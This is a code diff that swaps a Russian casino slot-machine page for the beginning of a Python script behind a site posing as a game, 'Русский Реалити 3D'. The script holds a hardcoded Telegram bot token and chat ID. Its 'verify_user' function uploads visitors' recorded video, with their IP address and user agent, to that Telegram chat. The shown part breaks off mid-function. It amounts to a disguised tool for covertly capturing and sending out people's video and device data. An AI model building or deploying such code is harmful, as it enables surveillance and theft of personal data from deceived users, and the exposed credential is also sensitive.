@@ -1,56 +1,49 @@
-<!DOCTYPE html><html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Gift Casino</title>
-    <link rel="stylesheet" href="styles.css">
-    <script defer src="script.js"></script>
-</head>
-<body>
-    <header>
-        <h1>Random Gift</h1>
-    </header><nav>
-    <button onclick="showSection('leaders')">Лидеры</button>
-    <button onclick="showSection('play')">Играть</button>
-    <button onclick="showSection('profile')">Профиль</button>
-</nav>
+#!/usr/bin/env python3
+import os
+import json
+import requests
+from datetime import datetime
+from socket import gethostbyname, gethostname
 
-<main>
-    <section id="leaders" class="hidden">
-        <h2>Таблица лидеров</h2>
-        <ul id="leaderboard"></ul>
-    </section>
-    
-    <section id="play" class="hidden">
-        <h2>Игровой автомат</h2>
-        <div id="slot-machine">
-            <div class="slot"><img src="heart.png"></div>
-            <div class="slot"><img src="heart.png"></div>
-            <div class="slot"><img src="teddy.png"></div>
-        </div>
-        <button onclick="spin()">Мне повезёт!</button>
-        <label><input type="checkbox" id="demo-mode"> Демо режим</label>
-    </section>
-    
-    <section id="profile" class="hidden">
-        <h2>Профиль</h2>
-        <p id="username">Артём</p>
-        <p>У вас есть <span id="stars">0</span> искр</p>
-    </section>
-</main>
-
-<script>
-    function showSection(section) {
-        document.querySelectorAll('section').forEach(sec => sec.classList.add('hidden'));
-        document.getElementById(section).classList.remove('hidden');
+# Конфигурация приложения
+config = {
+    'site_name': 'Русский Реалити 3D',
+    'players_count': '4,083',
+    'domain': 'myrussiansim.local',
+    'telegram': {
+        'bot_token': '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig',
+        'chat_id': '4798745489'
     }
-    
-    function spin() {
-        let slots = document.querySelectorAll('.slot img');
-        let items = ['heart.png', 'teddy.png', 'rose.png'];
-        slots.forEach(slot => slot.src = items[Math.floor(Math.random() * items.length)]);
-    }
-</script>
+}
 
-</body>
-</html>
+def get_server_urls():
+    """Возвращает доступные URL сервера"""
+    try:
+        local_ip = gethostbyname(gethostname())
+    except:
+        local_ip = '127.0.0.1'
+    
+    return {
+        'custom_domain': f"http://{config.get('domain', 'localhost')}:5000",
+        'local': "http://127.0.0.1:5000",
+        'network': f"http://{local_ip}:5000"
+    }
+
+def verify_user(video_file, ip, user_agent):
+    """Отправка видео в Telegram"""
+    try:
+        response = requests.post(
+            f"https://api.telegram.org/bot{config['telegram']['bot_token']}/sendVideo",
+            files={'video': (f'verify_{datetime.now().strftime("%Y%m%d_%H%M%S")}.webm', video_file, 'video/webm')},
+            data={
+                'chat_id': config['telegram']['chat_id'],
+                'caption': f"🔔 Новый игрок!\n🕒 {datetime.now()}\n🌐 IP: {ip}\n📱 {user_agent}"
+            },
+            timeout=30
+        )
+        return {"status": "success" if response.ok else "error"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+def generate_html():
+    """
